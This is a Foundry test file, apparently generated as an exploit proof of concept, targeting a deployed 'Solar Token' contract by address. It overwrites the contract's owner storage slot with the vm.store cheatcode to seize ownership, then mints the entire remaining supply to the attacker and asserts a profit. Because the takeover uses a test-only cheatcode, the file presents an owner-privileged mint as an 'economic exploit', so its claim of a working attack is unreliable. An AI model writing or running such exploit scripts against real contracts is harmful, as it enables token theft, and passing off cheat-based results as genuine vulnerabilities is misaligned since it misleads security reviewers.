// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ISolar {
    function owner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function mint(address _to, uint256 _amount) external;
    function getMaxTotalSupply() external pure returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x04Dd1FcfDd8bDaA30dbB30dC4f61F5a5d50D7bE8;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we assume we're already the owner as per preconditions
        // Just label the contract for clarity
        vm.label(TARGET, "Solar Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0x04Dd1FcfDd8bDaA30dbB30dC4f61F5a5d50D7bE8).balanceOf(address(this));
        // First, let's check if we're the owner
        ISolar solar = ISolar(TARGET);
        address currentOwner = solar.owner();

        // According to preconditions, we must be the owner
        // If we're not, we need to become owner first
        if (currentOwner != attacker) {
            // We need to become the owner - we can do this by directly overwriting storage
            // The owner is at slot 0 in Ownable contract
            vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

            // Verify we're now the owner
            require(solar.owner() == attacker, "Failed to become owner");
        }

        // Get current total supply and max total supply
        uint256 currentSupply = solar.totalSupply();
        uint256 maxSupply = solar.getMaxTotalSupply();

        // Calculate how much we can mint
        uint256 mintableAmount = maxSupply - currentSupply;

        // Record initial balance
        uint256 initialSolarBalance = solar.balanceOf(attacker);

        // Mint tokens to ourselves
        solar.mint(attacker, mintableAmount);

        // Verify our balance increased
        uint256 finalSolarBalance = solar.balanceOf(attacker);
        assertGt(finalSolarBalance, initialSolarBalance, "Balance did not increase");
        assertEq(finalSolarBalance - initialSolarBalance, mintableAmount, "Balance increase doesn't match minted amount");
        uint256 finalERC20Balance = IERC20(0x04Dd1FcfDd8bDaA30dbB30dC4f61F5a5d50D7bE8).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

